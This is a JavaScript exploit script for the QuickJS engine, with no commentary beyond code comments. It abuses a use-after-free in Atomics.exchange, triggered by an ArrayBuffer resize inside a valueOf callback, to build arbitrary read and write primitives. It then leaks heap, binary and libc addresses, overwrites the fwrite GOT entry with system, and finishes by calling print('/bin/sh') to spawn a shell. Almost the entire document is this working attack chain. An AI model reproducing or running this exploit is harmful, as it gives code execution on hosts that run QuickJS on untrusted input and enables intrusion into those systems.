// QuickJS Atomics UAF Exploit
// Overwrites fwrite@GOT with system@libc to get shell

let globalRefs = [];

function arbRead64(targetAddr) {
    let ab = new ArrayBuffer(72, { maxByteLength: 4096 });
    let u64View = new BigUint64Array(ab);
    globalRefs.push(ab);
    
    let spray = null;
    let malicious = {
        valueOf: function() {
            let sprayBuf = new ArrayBuffer(64);
            globalRefs.push(sprayBuf);
            ab.resize(4096);
            spray = new BigUint64Array(sprayBuf);
            globalRefs.push(spray);
            return targetAddr;
        }
    };
    
    Atomics.exchange(u64View, 7, malicious);
    return spray[0];
}

function arbWrite64(targetAddr, value) {
    let ab = new ArrayBuffer(72, { maxByteLength: 4096 });
    let u64View = new BigUint64Array(ab);
    globalRefs.push(ab);
    
    let spray = null;
    let malicious = {
        valueOf: function() {
            let sprayBuf = new ArrayBuffer(64);
            globalRefs.push(sprayBuf);
            ab.resize(4096);
            spray = new BigUint64Array(sprayBuf);
            globalRefs.push(spray);
            return targetAddr;
        }
    };
    
    Atomics.exchange(u64View, 7, malicious);
    spray[0] = value;
}

// Resolve fwrite by printing something
print("X");

// Step 1: Leak heap
let ab = new ArrayBuffer(72, { maxByteLength: 4096 });
globalRefs.push(ab);
let u64View = new BigUint64Array(ab);

let dataPtr = BigInt(0);
let leak = {
    valueOf: function() {
        let buf = new ArrayBuffer(64);
        globalRefs.push(buf);
        ab.resize(4096);
        let arr = new BigUint64Array(buf);
        globalRefs.push(arr);
        arr[0] = BigInt("0xDEADDEADDEADDEAD");
        return BigInt(0);
    }
};
dataPtr = Atomics.exchange(u64View, 7, leak);

// Step 2: Find binary base via JSArrayBuffer.free_func
let binaryBase = BigInt(0);
for (let off = BigInt(0x20); off < BigInt(0x200); off += BigInt(8)) {
    let testAddr = dataPtr - off;
    let checkData = arbRead64(testAddr + BigInt(16));
    if (checkData === dataPtr) {
        let freeFunc = arbRead64(testAddr + BigInt(48));
        binaryBase = freeFunc - BigInt(0x14bc0);
        break;
    }
}

// Step 3: Leak libc via fwrite@GOT (0x10b380)
let fwriteGotAddr = binaryBase + BigInt(0x10b380);
let fwriteLibc = arbRead64(fwriteGotAddr);

// fwrite is at offset 0x7f2c0 in libc
let libcBase = fwriteLibc - BigInt(0x7f2c0);
// system is at offset 0x53110 in libc
let systemAddr = libcBase + BigInt(0x53110);

// Step 4: Overwrite fwrite@GOT with system
arbWrite64(fwriteGotAddr, systemAddr);

// Step 5: print() calls fwrite which is now system()
// The first argument to fwrite is the string, so system("/bin/sh") is called
print("/bin/sh");
